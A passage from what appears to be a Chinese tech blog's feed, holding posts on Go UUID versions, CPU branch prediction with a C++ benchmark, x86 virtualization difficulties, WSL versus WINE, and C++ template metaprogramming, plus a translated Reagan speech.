class="token string">"failed to generate UUID: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span>u3 <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">NewV3</span><span class="token punctuation">(</span>u1<span class="token punctuation">,</span> <span class="token string">"uuid.v3"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>u3<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后生成的效果如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">b31741ed<span class="token operator">-</span>47ee<span class="token operator">-</span>34f1<span class="token operator">-</span>bdd6<span class="token operator">-</span>a73e7be61f1066dc196b<span class="token operator">-</span>ad5e<span class="token operator">-</span><span class="token number">3e52</span><span class="token operator">-</span>ad8d<span class="token operator">-</span>dd55d5f180bb  除了版本号和变体版本号之外，其他均不相同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因此，v3版本通过MD5哈希后相当于给了现有一个uuid再套一层。当然uuid对象本质是一个字节数组，我们也可以自定义一个字节数组作为参数传递。如：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>u3 <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">NewV3</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span><span class="token function">UUID</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uuid.v3"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>u3<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>相同参数下生成的uuid一定是一致的，这也是v3版本的一个特点。其源码比较简单，如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Gen<span class="token punctuation">)</span> <span class="token function">NewV3</span><span class="token punctuation">(</span>ns UUID<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">)</span> UUID <span class="token punctuation">{</span>    <span class="token comment">// 直接计算 md5(ns + name)</span>u <span class="token operator">:=</span> <span class="token function">newFromHash</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ns<span class="token punctuation">,</span> name<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVersion</span><span class="token punctuation">(</span>V3<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVariant</span><span class="token punctuation">(</span>VariantRFC4122<span class="token punctuation">)</span><span class="token keyword">return</span> u<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="uuid.v4">uuid.v4</h3><p>v4版本的生成依赖随机数，其源码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Gen<span class="token punctuation">)</span> <span class="token function">NewV4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>UUID<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>u <span class="token operator">:=</span> UUID<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadFull</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>rand<span class="token punctuation">,</span> u<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> Nil<span class="token punctuation">,</span> err<span class="token punctuation">}</span>u<span class="token punctuation">.</span><span class="token function">SetVersion</span><span class="token punctuation">(</span>V4<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVariant</span><span class="token punctuation">(</span>VariantRFC4122<span class="token punctuation">)</span><span class="token keyword">return</span> u<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，它和平台、硬件、时间都没关系，它也是使用最多的一种uuid生成方式。</p><h3 id="uuid.v5">uuid.v5</h3><p>v5版本和v3版本是一样的，只不过v5采用了SHA1算法来计算哈希，而v3采用的是MD5。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Gen<span class="token punctuation">)</span> <span class="token function">NewV5</span><span class="token punctuation">(</span>ns UUID<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">)</span> UUID <span class="token punctuation">{</span>u <span class="token operator">:=</span> <span class="token function">newFromHash</span><span class="token punctuation">(</span>sha1<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ns<span class="token punctuation">,</span> name<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVersion</span><span class="token punctuation">(</span>V5<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVariant</span><span class="token punctuation">(</span>VariantRFC4122<span class="token punctuation">)</span><span class="token keyword">return</span> u<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="如何选择">如何选择</h3><ul><li>v1基于mac地址和时间戳，可反向推导和预测，因此不推荐。</li><li>v3和v5能够实现相同参数产生相同的uuid，因此，在需要这种功能的场景下可以使用。</li><li>v4版本依赖随机数，更适合于大多数业务场景。</li><li>v2版本已经弃用，相比v1，它除了加入mac，还加入了标识符(GID/UID)，其暴露的用户信息更多。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>分支预测</title>
      <link href="/2023/08/28/fen-zhi-yu-ce/"/>
      <url>/2023/08/28/fen-zhi-yu-ce/</url>
      
        <content type="html"><![CDATA[<p>请看这样一段代码</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;chrono&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">constexpr</span> size_t RANGESZ <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">unsigned</span> arraySize <span class="token operator">=</span> <span class="token number">32768</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>            data<span class="token punctuation">[</span>arraySize<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>c <span class="token operator">:</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        c <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    std<span class="token double-colon punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> data <span class="token operator">+</span> arraySize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 560ms</span>    <span class="token comment">// std::sort(data, data + arraySize); // 1875ms</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> start <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>steady_clock<span class="token double-colon punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> RANGESZ<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> arraySize<span class="token punctuation">;</span> <span class="token operator">++</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span>                sum <span class="token operator">+=</span> data<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">auto</span> end     <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>steady_clock<span class="token double-colon punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> elapsed <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">duration_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>milliseconds<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"time = "</span> <span class="token operator">&lt;&lt;</span> elapsed<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"ms"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sum  = "</span> <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们用 256的模数随机填充一个固定大小的大数组，然后对数组的一半元素求和。</p><p>先排序后计算，运行效率有进3倍的提高。</p><p>为什么呢？</p><p>为了论证此问题，让我们回到19世纪，那个远距离无线通信还未普及的年代。你是铁路交叉口的扳道工。当听到火车快来了的时候，你无法猜测它应该朝哪个方向走。于是你叫停了火车，上前去问火车司机该朝哪个方向走，以便你能正确地切换铁轨。</p><p>要知道，火车是非常庞大的，切急速行驶时有巨大的惯性。为了完成上述停车-问询-切轨的一系列动作，火车需耗费大量时间减速，停车，重新开启。</p><p>既然上述过车非常耗时，那是否有更好的方法？当然有！当火车即将行驶过来前，你可以猜测火车该朝哪个方向走。</p><ul><li>如果猜对了，它直接通过，继续前行。</li><li>如果猜错了，车头将停止，倒回去，你将铁轨扳至反方向，火车重新启动，驶过道口。</li></ul><p>如果你不幸每次都猜错了，那么火车将耗费大量时间停车-倒回-重启。如果你很幸运，每次都猜对了呢？火车将从不停车，持续前行！</p><p>上述比喻可应用于处理器级别的分支跳转指令里：</p><p>原程序：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">if (data[c] &gt;= 128)    sum += data[c];   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>汇编码：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cmp edx, 128jl SHORT $LN3@mainadd rbx, rdx$LN3@main:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>让我们回到文章开头的问题。现在假设你是处理器，当看到上述分支时，当你并不能决定该如何往下走，该如何做？只能暂停运行，等待之前的指令运行结束。然后才能继续沿着正确地路径往下走。</p><p>要知道，现代编译器是非常复杂的，运行时有着非常长的pipelines，减速和热启动将耗费巨量的时间。</p><p>那么，有没有好的办法可以节省这些状态切换的时间呢？你可以猜测分支的下一步走向！</p><ul><li>如果猜错了，处理器要flush掉pipelines,回滚到之前的分支，然后重新热启动，选择另一条路径。</li><li>如果猜对了，处理器不需要暂停，继续往下执行。</li></ul><p>如果每次都猜错了，处理器将耗费大量时间在停止-回滚-热启动这一周期性过程里。如果侥幸每次都猜对了，那么处理器将从不暂停，一直运行至结束。</p><p>上述过程就是分支预测(branchprediction)。虽然在现实的道口铁轨切换中，可以通过一个小旗子作为信号来判断火车的走向，但是处理器却无法像火车那样去预知分支的走向--除非最后一次指令运行完毕。</p><p>那么处理器该采用怎样的策略来用最小的次数来尽量猜对指令分支的下一步走向呢？答案就是分析历史运行记录：如果火车过去90%的时间都是走左边的铁轨，本次轨道切换，你就可以猜测方向为左，反之，则为右。如果在某个方向上走过了3次，接下来你也可以猜测火车将继续在这个方向上运行...</p><p>换句话说，你试图通过历史记录，识别出一种隐含的模式并尝试在后续铁道切换的抉择中继续应用它。这和处理器的分支预测原理或多或少有点相似。</p><p>大多数应用都具有状态良好的(well-behaved)分支，所以现代化的分支预测器一般具有超过90%的命中率。但是面对无法预测的分支，且没有识别出可应用的的模式时，分支预测器就无用武之地了。</p><h2 id="优化">优化</h2><p>利用位运算取消分支跳转。基本知识：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">|x| &gt;&gt; 31 = 0 # 非负数右移31为一定为0~(|x| &gt;&gt; 31) = -1 # 0取反为-1-|x| &gt;&gt; 31 = -1 # 负数右移31为一定为0xffff = -1~(-|x| &gt;&gt; 31) = 0 # -1取反为0-1 = 0xffff-1 &amp; x = x # 以-1为mask和任何数求与，值不变<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故分支判断可优化为：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">int t = (data[c] - 128) &gt;&gt; 31; # statement 1sum += ~t &amp; data[c]; # statement 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>分析：</p><ol type="1"><li>data[c] &lt; 128, 则statement 1值为: 0xffff = -1, statement2等号右侧值为: 0 &amp; data[c] == 0;</li><li>data[c] &gt;= 128, 则statement 1值为: 0, statement 2等号右侧值为: ~0&amp; data[c] == -1 &amp; data[c] == 0xffff &amp; data[c] ==data[c];</li></ol><p>故上述位运算实现的sum逻辑完全等价于if-statement,更多的位运算hack操作请参见<a href="https://link.zhihu.com/?target=http%3A//graphics.stanford.edu/~seander/bithacks.html">bithacks</a>.</p><p>若想避免移位操作，可以使用如下方式：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">int t=-((data[c]&gt;=128)); # generate the masksum += ~t &amp; data[c]; # bitwise AND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="结论">结论</h2><ul><li>使用分支预测: 是否排序严重影响performance</li><li>使用bithack: 是否排序对performance无显著影响</li></ul><p>这个例子告诉给我们启示:在大规模循环逻辑中要尽量避免数据强依赖的分支(data-dependentbranching).</p><h2 id="补充知识">补充知识</h2><h3 id="pipeline">Pipeline</h3><p>先简单说明一下CPU的instructionpipeline(指令流水线)，以下简称pipeline。Pipieline假设程序运行时有一连串指令要被运行，将程序运行划分成几个阶段，按照一定的顺序并行处理之，这样便能够加速指令的通过速度。</p><p>绝大多数pipeline都由时钟频率(clock)控制，在数字电路中，clock控制逻辑门电路(logicalcicuit)和触发器(trigger),当受到时钟频率触发时，触发器得到新的数值，并且逻辑门需要一段时间来解析出新的数值，而当受到下一个时钟频率触发时触发器又得到新的数值，以此类推。</p><p>而借由逻辑门分散成很多小区块，再让触发器链接这些小区块组，使逻辑门输出正确数值的时间延迟得以减少，这样一来就可以减少指令运行所需要的周期。这对应Pipeline中的各个stages。</p><p>一般的pipeline有四个执行阶段(execuate stage): 读取指令(Fetch) -&gt;指令解码(Decode) -&gt; 运行指令(Execute) -&gt;写回运行结果(Write-back).</p><h3 id="分支预测器">分支预测器</h3><p>分支预测器是一种数字电路，在分支指令执行前，猜测哪一个分支会被执行，能显著提高pipelines的性能。</p><p>条件分支通常有两路后续执行分支，nottoken时,跳过接下来的JMP指令，继续执行，token时，执行JMP指令，跳转到另一块程序内存去执行。</p><p>为了说明这个问题，我们先考虑如下问题。</p><h4 id="没有分支预测器会怎样">没有分支预测器会怎样？</h4><p>加入没有分支预测器，处理器会等待分支指令通过了pipeline的执行阶段(execuatestage)才能把下一条指令送入pipeline的fetch stage。</p><p>这会造成流水线停顿(stalled)或流水线冒泡(bubbling)或流水线打嗝(hiccup)，即在流水线中生成一个没有实效的气泡。</p><h4 id="常见的分支预测器">常见的分支预测器</h4><ul><li>静态分支预测器</li><li>双模态预测器(bimodal predictor) 也叫饱和计数器，是一个四状态状态机.四个状态对应两个选择: token, not token，每个选择有两个状态区分强弱：strongly,weakly。分别是Strongly nottaken，Weakly not taken, Weakly taken, Strongly taken。</li></ul><h3 id="位运算-hack">位运算 Hack</h3><p>http://graphics.stanford.edu/~seander/bithacks.html</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我们终将一战 - 里根</title>
      <link href="/2023/08/15/wo-men-zhong-jiang-yi-zhan-li-gen/"/>
      <url>/2023/08/15/wo-men-zhong-jiang-yi-zhan-li-gen/</url>
      
        <content type="html"><![CDATA[<p>让我把话说清楚，在战争与和平之间选择的结果已毫无争议可言，但是有一个方法，可以实现绝对的和平，而且你在下一秒就可以获得和平，那就是投降。</p><p>必须承认，除了投降之外的所有道路都需要我们冒着未知的危险。但是历史上无数的事实告诉我们，姑息养恶、后患无穷，而这正是我们一厢情愿的自由主义朋友们拒绝面对的事实——他们的迁就正纵欲养恶，使我们在战争与和平之间别无他法，只有战斗和投降。如果我们继续妥协、退缩、撤退、逃避，最终我们将面对敌人的最后苛求与最后通牒。然后呢？当尼基塔·赫鲁晓夫告诉苏联人：他已经知道美国佬对于问题的答案是什么了。他会说，我们在冷战的压力之下节节败退。最终当有一日，他们发出最后通牒时，我们的投降是完全自愿、不由自主的，因为到那时候，我们早已在精神、道德和经济层面上都已经千疮百孔、不堪一击。我们的敌人坚信这一点，因为他已经听到“不惜一切代价换取和平”和“红了总比死了好”的论调。或者像某个评论员说的那样——“宁可跪着生，也不愿站着死”。到那时候战争将会爆发，因为这些观点不能代表我们剩下的人。</p><p>你我都清楚，勿信谗言。交出你宝贵的自由并不能换取风调雨顺。如果没有事情值得我们以死相搏，那么我们在今天才学会勇敢，来对抗我们今天的敌人？摩西会告诉以色列的子民们世世代代活在法老王的奴役之下？难道耶稣该逃避受十字架之刑而苟且偷生？康科德战役中的美国爱国者该丢下枪举起手，让那响彻全世界的枪声消失在历史之中吗？历史上的先烈并不是傻瓜，而那些在抵抗纳粹战斗中为国捐躯的士兵们并没有白白死去。</p><p>那么敢问和平之路究竟在何方？这个沉重的问题有一个十分简单的答案。</p><p>就是你与我都鼓起勇气，面对我们的敌人说：“有一种代价我们绝不能容忍，有些界限我们永远不会允许别人逾越”。温斯顿·丘吉尔曾说：“人的命运，不是物质和数字能够运算出来的。当命运的巨轮转动世界时，我们会发觉，人类不是没有灵魂的躯壳。这是一种在历史长河、广袤苍穹中流动不息的永恒真理，它有一个名字，不管你是否喜欢，它叫做——“责任”。</p><p>你和我命运有约。</p><p>我们要为下一代捍卫其福祉，否则会万劫不复。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈虚拟化技术难点</title>
      <link href="/2023/08/14/qian-tan-xu-ni-hua-ji-zhu-nan-dian/"/>
      <url>/2023/08/14/qian-tan-xu-ni-hua-ji-zhu-nan-dian/</url>
      
        <content type="html"><![CDATA[<p>VMM 在 2006 年之后的确变简单了。1998年之前的 x86是号称无法完全虚拟化的，然后“某几个人”搞了出来，于是就有了 VMware。</p><p>早期 VMM 难以实现的原因：</p><ul><li>最大难题：x86 的某些指令，在非 ring 0 的情况下执行，行为和在 ring 0下不同，并且不会产生 fault，这导致了 trap-n-emulate 形式的Virtualization没办法直接实现，这也是早期被认为是无法虚拟化的主要原因。</li><li>解决方法是 binarytranslation，代码极其复杂，需要深厚内力才能读懂，更别说写出来。compiler、OS、architecture的知识一样不能少。</li><li>MMU的虚拟化。虚拟内存提供了virtual address -&gt; physical address 的mapping，但是要想 virtualize 一个 guest OS，那么就要做到virtual address-&gt; guest virtual physical address -&gt; machine address 的mapping。于是就要在MMU里面动手脚，创建一个 shadow page table，完成virtual address -&gt; machine address的直接翻译，为了保持正确性，必须对OS透明地维护好TLB，并监视 guest OS对自己认为的真正的 page table的一切修改。这个过程可以简单粗暴，只要guest一load CR3就清空shadow pagetable，flush TLB。也可是十分细腻，对 shadow page table做更加细致的更新。前者实现复杂度略低，性能自然很差，因为TLB missrate奇高，并且由于要经常清空 shadow page table，page fault也更多。后者性能好，但是实现异常复杂，cache consistency难以维护。</li><li>IO。如果不计性能，这块其实比较容易解决，但是也需要对 PCI device的工作机制有着深厚的理解。早期的 vmm 对 IO 几乎就是直接 emulate。</li><li>CPU 的虚拟化，CPU的型号一大堆，每个型号之间的指令集和指令行为都有不同。还有很多 CPU有bug，于是为了 over come 这些，monitor 里面要做很多 ad hoc的修改。</li><li>其他：BIOS，perforamce monitoring，hardwarecounters，graphics，guest crash handling，interrupt delivery 等今天 VMM难以实现：</li><li>CPU种类繁多</li><li>PCI pass through 的维护</li><li>达到近乎 native running 的速度</li><li>高并发 I/O</li><li>concurrent bugs 和 lock contention</li><li>numa</li><li>security</li><li>cache consistency...</li><li>Virtualization 的好朋友 Emulation 本身也很复杂，参考 qemu</li></ul><p>在硬件虚拟化技术推出之前，VMware 使用动态二进制翻译（Dynamic BinaryTranslation，DBT）技术，其中的工作个人认为和搞编译器后端的那帮人从事的差不多，只不过DBT 的输入已经是一段二进制指令，DBT要将其翻译成另一段“对虚拟化友好”（能降权在 Ring 3执行并在适当的时候让VMM得到通知）的二进制指令。概要地说，大部分算术运算指令（add、inc之类）可以保持原样或仅需微小改动，涉及处理器状态的指令（如CLI、load/store cr3、r/w msr 等）需要产生到 VMM 的 function call 并由VMM 模拟执行，跳转指令也需要做特殊处理。其实光写一个 x86 的 disassembler就已经够费劲的了，更不必说这种还要对指令进行精密调整的工作了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WSL 与 WINE: Subsystem 与 API 翻译</title>
      <link href="/2023/08/13/wsl-yu-wine-subsystem-yu-api-fan-yi/"/>
      <url>/2023/08/13/wsl-yu-wine-subsystem-yu-api-fan-yi/</url>
      
        <content type="html"><![CDATA[<p>WSL 对于 Windows 系统来说属于用户态程序，通过虚拟文件系统接口，以DriveFs 文件系统挂载到 Windows 从而提供和 Windows 的互操作能力。lxss.sys 和 lxcore.sys 这两个驱动负责模拟 Linux内核并实时拦截系统调用。相应的驱动会将 Linux 内核调用映射为对应的Windows 内核调用。根据从微软内部的压力测试工具据来看，WSL的性能表现非常接近用相同硬件直接运行 Linux 的性能，几乎可以获得同等的CPU、内存和 I/O 性能，这证明 WSL 在性能方面的表现很出色。</p><p>WSL 并不是传统上的 NT Subsystem，传统的 NT Subsystem 是 Ring-3 NativeAPI + Win32 API 实现的，POSIX 和 OS/2 皆是如此，他们的可执行程序还都是PE。简单的说，NT 内核在进程创建线程创建 Context Switch等等地方实现了一套 Hook Callback机制，在这个最底层机制的支持下，微软实现了 Linux 的操作系统原语，比方说fork，也就是 picoprocess。可以认为微软把 NT 内核变成了一个兼容版 Linux内核，它可以直接加载执行ELF。另外，可执行映像里面的指令是关于机器的，Linux 和 Windows之间应当不需要“翻译二进制”。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++ 模板元编程</title>
      <link href="/2023/08/13/c-mo-ban-yuan-bian-cheng/"/>
      <url>/2023/08/13/c-mo-ban-yuan-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><strong>概述</strong></h2><p>模板元编程可在编译时完成一些计算，说它是屠龙之技，是因为模板元编程</p><ul><li>似乎很厉害的样子。</li><li>似乎没有地方可以用上。</li></ul><p>假如只从实际工程出发，没有太大必要研究模板元编程。只是我还是想写写这个主题，感叹一下模板居然可以做这种事情。</p><p>本文假设大家知道 C++ 模板元编程、编译期计算等概念。先上完整代码：</p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/hjcapple/MetaLisp">MetaLisp</a></p><p>可以对照着代码看下文。代码中，首先用 C++ 模板来模拟 Scheme的常用函数。再将 Scheme 代码改写成 C++ 模板，实现一些计算。基本上任何Scheme 代码都可以按照这种方式改写。</p><p>代码中包含一些元编程例子。简单例子是计算阶乘、计算平方根。复杂点的例子是，求解八皇后、huffman编码。</p><h2 id="编程语言特性"><strong>编程语言特性</strong></h2><p>假如将模板当成一门全新的编程语言。一门编程语言最少应该具有什么特性呢？</p><ol type="1"><li>需要有基本的数据类型，比如数字、字符串、布尔值等。</li><li>需要某种方法，将基础类型组合起来，表达更高级的概念。比如 C 语言中的struct, 就是一种组合方法。数组和字典也是组合方法。</li><li>需要流程控制。典型的是顺序、分支、循环。</li><li>需要输入和输出。</li></ol><p>还需要什么语言特性呢？已经没有了，具备上述的特性，基本就可写出任何程序。</p><p>下面按照这个顺序，描述一下模板元编程。</p><h2 id="基本数据类型"><strong>基本数据类型</strong></h2><h2 id="数字"><strong>数字</strong></h2><p>数字可分为整数和小数。怎么用模板类型表示整数呢？大概这样</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">int</span> N<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">number</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int</span> value <span class="token operator">=</span> N<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样每个整数都对应一种类型。那小数呢？C++ 的模板参数不可以是<code>double</code>, 下面的语法是错误的</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">double</span> N<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">number</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">double</span> value <span class="token operator">=</span> N<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是我们可以将小数表示成分数，有分子和分母。于是数字可以表示为</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">int64_t</span> N<span class="token punctuation">,</span> <span class="token keyword">int64_t</span> D <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">number</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> numer <span class="token operator">=</span> N<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> denom <span class="token operator">=</span> D<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当分母为 1 时，其实就是整数。当然我们需要简化分子和分母，在编译期实现<code>gcd</code> （求最大公约数）算法。</p><h2 id="布尔值"><strong>布尔值</strong></h2><p>布尔值其实可归类为数字。但经常将布尔值单独拆分出来，用于条件判断。布尔值可表达为如下的模板类型。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">bool</span> flag<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">boolean</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> value <span class="token operator">=</span> flag<span 